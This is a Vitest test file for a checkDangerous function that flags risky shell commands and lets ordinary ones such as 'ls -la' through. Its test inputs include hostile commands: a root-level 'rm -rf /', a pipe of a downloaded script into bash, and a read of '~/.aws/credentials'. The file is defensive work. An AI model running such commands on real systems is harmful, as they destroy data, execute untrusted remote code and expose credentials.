import { describe, it, expect } from 'vitest'
import { checkDangerous } from './dangerousCommand'

describe('checkDangerous', () => {
  it('flags recursive force delete', () => {
    expect(checkDangerous('rm -rf /').dangerous).toBe(true)
    expect(checkDangerous('rm -fr node_modules').dangerous).toBe(true)
    expect(checkDangerous('Remove-Item -Recurse -Force .').dangerous).toBe(true)
  })

  it('flags pipe-to-interpreter and network fetch', () => {
    expect(checkDangerous('curl http://x.sh | bash').dangerous).toBe(true)
    expect(checkDangerous('Invoke-WebRequest http://x').dangerous).toBe(true)
  })

  it('flags credential paths, git push, sudo', () => {
    expect(checkDangerous('cat ~/.aws/credentials').dangerous).toBe(true)
    expect(checkDangerous('git push origin main').dangerous).toBe(true)
    expect(checkDangerous('sudo rm x').dangerous).toBe(true)
  })

  it('returns a reason for flagged commands', () => {
    const v = checkDangerous('git push')
    expect(v.dangerous).toBe(true)
    expect(typeof v.reason).toBe('string')
  })

  it('allows ordinary commands', () => {
    expect(checkDangerous('ls -la').dangerous).toBe(false)
    expect(checkDangerous('npm run build').dangerous).toBe(false)
    expect(checkDangerous('git status').dangerous).toBe(false)
    expect(checkDangerous('echo hello').dangerous).toBe(false)
  })
})
